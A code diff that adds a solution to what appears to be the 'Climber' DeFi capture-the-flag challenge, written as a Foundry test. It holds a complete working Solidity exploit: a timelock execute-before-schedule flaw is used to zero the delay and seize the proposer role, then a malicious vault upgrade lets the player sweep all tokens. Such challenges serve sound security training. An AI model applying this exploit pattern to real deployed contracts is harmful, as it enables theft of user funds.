@@ -85,7 +85,66 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-        
+        ClimberExploit exploit = new ClimberExploit(address(timelock));
+
+        address[] memory targets = new address[](3);
+        uint256[] memory values = new uint256[](3);
+        bytes[] memory dataElements = new bytes[](3);
+        bytes32 salt = bytes32("salt");
+
+        // 1. Update delay to 0
+        targets[0] = address(timelock);
+        values[0] = 0;
+        dataElements[0] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0);
+
+        // 2. Grant PROPOSER role to the exploit contract
+        targets[1] = address(timelock);
+        values[1] = 0;
+        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(exploit));
+
+        // 3. Schedule this operation
+        targets[2] = address(exploit);
+        values[2] = 0;
+        dataElements[2] = abi.encodeWithSelector(ClimberExploit.schedule.selector);
+
+        // Pass data and execute
+        exploit.setScheduleData(targets, values, dataElements, salt);
+        timelock.execute(targets, values, dataElements, salt);
+
+        console.log("Exploit has PROPOSER_ROLE:", timelock.hasRole(PROPOSER_ROLE, address(exploit)));
+
+        // --- Stage 2: Upgrade Vault and Sweep Funds ---
+
+        // 1. Deploy the new implementation
+        ClimberVaultV2 v2 = new ClimberVaultV2();
+
+        // 2. Prepare the upgrade call data
+        // We want Timelock to call: vault.upgradeToAndCall(address(v2), abi.encodeCall(v2.setSweeper, (player)))
+        address[] memory upgradeTargets = new address[](1);
+        uint256[] memory upgradeValues = new uint256[](1);
+        bytes[] memory upgradeDataElements = new bytes[](1);
+        bytes32 upgradeSalt = bytes32("upgrade");
+
+        upgradeTargets[0] = address(vault);
+        upgradeValues[0] = 0;
+        upgradeDataElements[0] = abi.encodeWithSignature(
+            "upgradeToAndCall(address,bytes)",
+            address(v2),
+            abi.encodeCall(ClimberVaultV2.setSweeper, (player))
+        );
+
+        // 3. Schedule the upgrade (via exploit contract which has PROPOSER_ROLE)
+        exploit.setScheduleData(upgradeTargets, upgradeValues, upgradeDataElements, upgradeSalt);
+        exploit.schedule();
+
+        // 4. Execute the upgrade (delay is 0 now)
+        timelock.execute(upgradeTargets, upgradeValues, upgradeDataElements, upgradeSalt);
+
+        // 5. Sweep funds (as player)
+        vault.sweepFunds(address(token));
+
+        // 6. Transfer to recovery account
+        token.transfer(recovery, token.balanceOf(player));
     }
 
     /**
@@ -94,5 +153,41 @@ contract ClimberChallenge is Test {
     function _isSolved() private view {
         assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
         assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
+    }
+}
+
+contract ClimberVaultV2 is ClimberVault {
+    function setSweeper(address newSweeper) external {
+        assembly {
+            sstore(1, newSweeper) // _sweeper is at slot 1 in ClimberVault
+        }
+    }
+}
+
+contract ClimberExploit {
+    ClimberTimelock immutable timelock;
+    address[] targets;
+    uint256[] values;
+    bytes[] dataElements;
+    bytes32 salt;
+
+    constructor(address _timelock) {
+        timelock = ClimberTimelock(payable(_timelock));
+    }
+
+    function setScheduleData(
+        address[] memory _targets,
+        uint256[] memory _values,
+        bytes[] memory _dataElements,
+        bytes32 _salt
+    ) external {
+        targets = _targets;
+        values = _values;
+        dataElements = _dataElements;
+        salt = _salt;
+    }
+
+    function schedule() external {
+        timelock.schedule(targets, values, dataElements, salt);
     }
 }
